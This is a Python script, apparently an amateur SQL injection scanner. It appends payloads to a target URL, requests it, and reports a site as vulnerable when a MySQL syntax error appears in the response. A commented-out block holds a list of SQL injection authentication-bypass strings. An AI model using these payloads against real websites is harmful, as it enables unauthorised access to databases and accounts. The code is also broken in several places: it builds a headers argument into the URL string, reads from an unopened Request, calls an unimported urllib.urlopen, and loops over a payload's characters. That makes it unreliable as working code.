import sys
from sys import *
from urllib.request import Request, urlopen


try:
    i=argv[1]
except:
    i=""
try:
    url=argv[2]
except:
    url=""
try:
    j=argv[3]
except:
    j=""
try:
    payload=argv[4]
except:
    payload=""
if i == "":
    print("Usage:")
    print(" -u : enter url ")
    print(" -p : enter payload")
    print(" -h : for help ")
elif i == "-h":
    print("Usage:")
    print(" -u : enter url ")
    print(" -p : enter payload")
elif i == "-u":
    if url == "":
        print("Please enter the valid url.")
    else:
        if j == "":
            print("Please select the payload using -p.")
        elif j == "-p":
            if payload == "":
                print("Invalid payload.")
            else:
                try:
                    print(url+payload+",headers={'User-Agent': 'Mozilla/5.0'}")
                    resp = Request(url + payload+",headers={'User-Agent': 'Mozilla/5.0'}")
                    body = resp.read()
                    fullbody = body.decode('utf-8')
                except:
                    print("[-] Error! Manually check this payload: " + payload)
                    errorr = "no"

"""
fullurl = input("Url: ")
errormsg = "You have an error in your SQL syntax"
payloads=['\'','1=1','=']
#payloads = ["'admin'or 1=1 or ''='", "'=1\' or \'1\' = \'1\'", "'or 1=1", "'1 'or' 1 '=' 1", "'or 1=1#", "'0 'or' 0 '=' 0", "'admin'or 1=1 or ''='", "'admin' or 1=1", "'admin' or '1'='1", "'or 1=1/*", "'or 1=1--"] #whatever payloads you want here ## YOU CAN ADD YOUR OWN
errorr = "yes"
fullbody = ""

print("Available payloads are listed below")
for i in range(0,len(payloads)):
    print("Type",i , "=", payloads[i])

store = int(input("Enter your choice = " ))

try:
    payload = str(payloads[store])
    resp = urllib.urlopen(fullurl + payload)
    body = resp.read()
    fullbody = body.decode('utf-8')
except:
    print("[-] Error! Manually check this payload: " + payload)
    errorr = "no"
    # sys.exit()




for payload in payloads[store]:
    try:
        payload = str(payload)
        resp = urllib.urlopen(fullurl + payload)
        body = resp.read()
        fullbody = body.decode('utf-8')
    except:
        print ("[-] Error! Manually check this payload: " + payload)
        errorr = "no"
        #sys.exit()
    if errormsg in fullbody:
        if errorr == "no":
            print ("[-] That payload might not work!")
            errorr = "yes"
        else:
            print ("[+] The website is SQL injection vulnerable! Payload: " + payload)
    else:
        print ("[-] The website is not SQL injection vulnerable!")
"""

